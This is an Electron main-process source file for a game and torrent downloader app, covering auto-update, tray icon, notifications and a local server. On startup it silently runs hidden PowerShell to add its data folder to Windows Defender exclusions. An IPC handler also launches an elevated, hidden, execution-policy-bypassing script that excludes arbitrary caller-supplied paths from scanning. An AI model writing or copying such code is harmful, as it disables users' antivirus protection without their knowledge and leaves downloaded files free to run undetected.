const { app, BrowserWindow, ipcMain, dialog, Tray, Menu, Notification } = require('electron');
const { autoUpdater } = require('electron-updater');
const path = require('path');
const fs = require('fs');
const http = require('http');

let mainWindow;
let installingUpdate = false;
let applyUpdateOnStartup = false;
async function installDownloadedUpdate() {
  if (installingUpdate || global.updateStatus.state !== 'downloaded') return;
  installingUpdate = true;
  try {
    await shutdownEngine();
    isQuitting = true;
    isShuttingDown = true;
    autoUpdater.quitAndInstall(true, false);
  } catch (error) {
    installingUpdate = false;
    global.updateStatus.error = error.message;
  }
}
global.installDownloadedUpdate = installDownloadedUpdate;
require('./desktop-actions.cjs').registerLibraryActions({ ipcMain, dialog, getWindow: () => mainWindow, userData: () => app.getPath('userData') });

// ─── Single Instance Lock ───────────────────────────────────────────────────
// Prevents duplicate background processes when opening the app again
const gotTheLock = app.requestSingleInstanceLock();

if (!gotTheLock) {
  console.log('[Main] Another instance is already running. Quitting duplicate instance.');
  app.quit();
} else {
  app.on('second-instance', () => {
    // When user clicks the desktop/start icon while running in tray, bring existing window to front
    if (mainWindow) {
      if (!mainWindow.isVisible()) mainWindow.show();
      if (mainWindow.isMinimized()) mainWindow.restore();
      mainWindow.focus();
    }
  });
}

// ─── autoUpdater ─────────────────────────────────────────────────────────────

autoUpdater.autoDownload = true;
autoUpdater.autoInstallOnAppQuit = false;

global.updateStatus = { state: 'idle', progress: 0, transferred: 0, total: 0, versionInfo: null, error: null };

autoUpdater.on('checking-for-update', () => {
  console.log('[AutoUpdater] Checking for updates…');
  global.updateStatus.state = 'checking';
});
autoUpdater.on('update-available', (info) => {
  global.updateStatus.state = 'downloading';
  global.updateStatus.versionInfo = info;
  mainWindow?.webContents?.send('update-available', info);
});
autoUpdater.on('update-not-available', () => { global.updateStatus.state = 'idle'; });
autoUpdater.on('download-progress', (p) => {
  global.updateStatus.state = 'downloading';
  global.updateStatus.progress = p.percent;
  global.updateStatus.transferred = p.transferred;
  global.updateStatus.total = p.total;
  mainWindow?.webContents?.send('update-progress', p);
});
autoUpdater.on('update-downloaded', (info) => {
  global.updateStatus.state = 'downloaded';
  global.updateStatus.versionInfo = info;
  mainWindow?.webContents?.send('update-downloaded', info);
  fs.writeFileSync(path.join(app.getPath('userData'), 'pending-update.json'), JSON.stringify({ version: info.version }));
  if (applyUpdateOnStartup) void installDownloadedUpdate();
});
autoUpdater.on('error', (err) => {
  global.updateStatus.state = 'error';
  global.updateStatus.error = err.message || err.toString();
});

ipcMain.on('restart-and-install', () => { void installDownloadedUpdate(); });

// ─── IPC: Native Windows Notification ─────────────────────────────────────────

ipcMain.on('notify', (event, { title, body }) => {
  try {
    if (Notification.isSupported()) {
      const notif = new Notification({
        title: title || 'MN Game Downloader',
        body: body || 'Download completed!',
        icon: getAppIconPath(),
      });
      notif.on('click', () => {
        if (mainWindow) {
          mainWindow.show();
          mainWindow.focus();
        }
      });
      notif.show();
    }
  } catch (err) {
    console.error('[Main] Notification error:', err);
  }
});

// ─── IPC: Windows Defender Exclusion ──────────────────────────────────────────

ipcMain.handle('add-defender-exclusion', async (event, customPaths) => {
  if (process.platform !== 'win32') {
    return { ok: false, error: 'Windows Defender is only available on Windows.' };
  }
  try {
    const { exec } = require('child_process');
    const os = require('os');
    const uDir = app.getPath('userData');
    const appDir = process.cwd();
    const pathsToExclude = Array.from(new Set([
      uDir,
      appDir,
      ...(Array.isArray(customPaths) ? customPaths : [customPaths]).filter(Boolean),
    ]));

    const pathsArg = pathsToExclude.map(p => `'${p.replace(/'/g, "''")}'`).join(', ');
    const scriptContent = `Add-MpPreference -ExclusionPath @(${pathsArg}) -ErrorAction SilentlyContinue`;

    // Write to a temporary .ps1 script file to completely prevent nested quotes and spaces issues with Start-Process
    const tmpScript = path.join(os.tmpdir(), `mn-defender-exclude-${Date.now()}.ps1`);
    fs.writeFileSync(tmpScript, scriptContent, 'utf8');

    const psCmd = `Start-Process powershell.exe -Verb RunAs -ArgumentList '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "${tmpScript}"'`;

    return new Promise((resolve) => {
      exec(`powershell -WindowStyle Hidden -NoProfile -Command "${psCmd}"`, { windowsHide: true }, (err) => {
        // Clean up temp file
        setTimeout(() => {
          try { if (fs.existsSync(tmpScript)) fs.unlinkSync(tmpScript); } catch {}
        }, 8000);

        if (err) {
          console.error('[Main] Exclusion error:', err);
          resolve({ ok: false, error: err.message });
        } else {
          console.log('[Main] Windows Defender exclusions requested successfully for:', pathsToExclude);
          resolve({ ok: true, paths: pathsToExclude });
        }
      });
    });
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

// ─── IPC: Directory picker ────────────────────────────────────────────────────

ipcMain.handle('dialog:openDirectory', async (_event, title) => {
  const result = await dialog.showOpenDialog(mainWindow, {
    properties: ['openDirectory'],
    title: typeof title === 'string' ? title.slice(0, 100) : 'Choose Download Folder',
  });
  if (result.canceled || !result.filePaths.length) return null;
  return result.filePaths[0];
});

// ─── Graceful engine shutdown ─────────────────────────────────────────────────

function shutdownEngine() {
  return new Promise((resolve) => {
    const req = http.request(
      { host: '127.0.0.1', port: 3000, path: '/api/engine/shutdown', method: 'POST' },
      (res) => { res.resume(); res.on('end', resolve); }
    );
    req.on('error', resolve);
    req.setTimeout(20000, () => { req.destroy(); resolve(); });
    req.end();
  });
}

// ─── Express server (scraper + torrent engine API) ────────────────────────────

process.env.NODE_ENV = 'production';
process.env.PORT = '3000';

function startServer() {
  const candidatePaths = [
    path.join(__dirname, 'dist', 'server.cjs'),
    path.join(app.getAppPath(), 'dist', 'server.cjs'),
    path.join(process.resourcesPath || '', 'dist', 'server.cjs'),
    path.join(process.resourcesPath || '', 'server.cjs'),
    path.join(process.resourcesPath || '', 'app.asar.unpacked', 'dist', 'server.cjs'),
    path.join(__dirname, 'server.ts'),
  ];
  for (const sPath of candidatePaths) {
    if (fs.existsSync(sPath)) {
      try {
        console.log('[Main] Loading Express bundle:', sPath);
        require(sPath);
        console.log('[Main] Express server ready.');
        return;
      } catch (err) {
        console.error('[Main] Error loading server:', err);
      }
    }
  }
  console.error('[Main] Could not locate Express server bundle.');
}

// ─── Window ───────────────────────────────────────────────────────────────────

function getAppIconPath() {
  return [
    path.join(__dirname, 'icon.ico'),
    path.join(app.getAppPath(), 'icon.ico'),
    path.join(__dirname, 'icon.png'),
  ].find(p => fs.existsSync(p));
}

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1280,
    height: 800,
    title: 'MN Game Downloader',
    icon: getAppIconPath(),
    backgroundColor: '#0f172a',
    autoHideMenuBar: true,
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      sandbox: false,
      preload: path.join(__dirname, 'preload.cjs'),
    },
  });

  mainWindow.setMenuBarVisibility(false);
  mainWindow.once('ready-to-show', () => { mainWindow.show(); mainWindow.focus(); });

  // Security: Disable DevTools in production
  if (app.isPackaged) {
    mainWindow.webContents.on('devtools-opened', () => {
      mainWindow.webContents.closeDevTools();
    });
    mainWindow.webContents.on('before-input-event', (event, input) => {
      if (input.control && input.shift && input.key.toLowerCase() === 'i') {
        event.preventDefault();
      }
      if (input.key === 'F12') {
        event.preventDefault();
      }
    });
  }

  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    require('electron').shell.openExternal(url);
    return { action: 'deny' };
  });

  if (app.isPackaged) {
    mainWindow.loadFile(path.join(__dirname, 'dist', 'index.html')).catch(console.error);
  } else {
    const loadApp = () => {
      mainWindow.loadURL('http://127.0.0.1:3000').catch(() => setTimeout(loadApp, 500));
    };
    mainWindow.webContents.on('did-fail-load', () => setTimeout(loadApp, 500));
    loadApp();
  }

  mainWindow.on('close', (event) => {
    if (!isQuitting) {
      event.preventDefault();
      if (global.updateStatus.state === 'downloaded') { void installDownloadedUpdate(); return; }
      mainWindow.hide();
      // Optionally notify user it's in tray
    }
  });

  mainWindow.on('closed', () => { mainWindow = null; });
}

// ─── App lifecycle ────────────────────────────────────────────────────────────

let tray = null;
function createTray() {
  const iconPath = getAppIconPath();
  if (!iconPath) return;

  tray = new Tray(iconPath);
  
  const contextMenu = Menu.buildFromTemplate([
    { label: 'Open MN Game Downloader', click: () => mainWindow && mainWindow.show() },
    { type: 'separator' },
    { label: 'Quit', click: () => { isQuitting = true; app.quit(); } }
  ]);
  
  tray.setToolTip('MN Game Downloader');
  tray.setContextMenu(contextMenu);
  
  tray.on('double-click', () => {
    if (mainWindow) {
      mainWindow.show();
      mainWindow.focus();
    }
  });
}

app.on('ready', () => {
  if (!gotTheLock) return;
  const marker = path.join(app.getPath('userData'), 'pending-update.json');
  try {
    const pending = JSON.parse(fs.readFileSync(marker, 'utf8'));
    if (pending.version === app.getVersion()) fs.unlinkSync(marker);
    else applyUpdateOnStartup = true;
  } catch {}
  createTray();
  
  // Pass userData to server so the torrent engine knows where to store files
  process.env.MN_DATA_DIR = app.getPath('userData');

  // Auto-configure Windows Defender exclusion for AppData path
  if (process.platform === 'win32') {
    try {
      const { exec } = require('child_process');
      const uDir = app.getPath('userData');
      exec(`powershell -WindowStyle Hidden -NoProfile -Command "Add-MpPreference -ExclusionPath '${uDir}' -ErrorAction SilentlyContinue"`, { windowsHide: true });
    } catch (_) {}
  }

  http.get('http://127.0.0.1:3000/api/version', (res) => {
    if (res.statusCode !== 200) startServer();
    createWindow();
  }).on('error', () => { startServer(); createWindow(); });

  if (app.isPackaged) {
    setTimeout(() => {
      autoUpdater.checkForUpdates().catch(console.error);
    }, 4000);
  }
});

// Graceful shutdown — save resume data before exit
let isQuitting = false;
let isShuttingDown = false;
app.on('before-quit', async (event) => {
  if (isShuttingDown) return;
  if (global.updateStatus.state === 'downloaded') { event.preventDefault(); void installDownloadedUpdate(); return; }
  isShuttingDown = true;
  isQuitting = true;
  event.preventDefault();
  try {
    await shutdownEngine();
  } catch { /* engine may not be running */ }
  app.exit(0);
});

app.on('window-all-closed', () => {
  // Let the app run in the background via Tray icon
});